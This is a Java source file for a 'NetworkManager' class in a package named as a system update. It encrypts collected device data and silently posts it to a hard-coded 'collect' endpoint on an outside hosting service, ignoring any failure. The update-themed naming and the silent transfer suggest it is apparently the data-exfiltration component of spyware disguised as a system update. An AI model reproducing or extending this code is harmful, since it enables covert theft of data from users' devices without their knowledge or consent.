package com.system.update.network;

import com.system.update.core.SecurityShield;
import okhttp3.*;
import org.json.JSONObject;
import java.util.HashMap;
import java.util.Map;

public class NetworkManager {
    private static final String SERVER_URL = "https://system-update-h32p.onrender.com/api/v1/collect";
    private final OkHttpClient client = new OkHttpClient();
    private final SecurityShield shield = new SecurityShield();

    public void sendData(String deviceId, Map<String, Object> data) {
        try {
            String encryptedPayload = shield.encrypt(data, deviceId);
            
            JSONObject json = new JSONObject();
            json.put("device_id", deviceId);
            json.put("payload", encryptedPayload);

            RequestBody body = RequestBody.create(
                MediaType.parse("application/json; charset=utf-8"),
                json.toString()
            );

            Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(body)
                .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, java.io.IOException e) {
                }

                @Override
                public void onResponse(Call call, Response response) throws java.io.IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
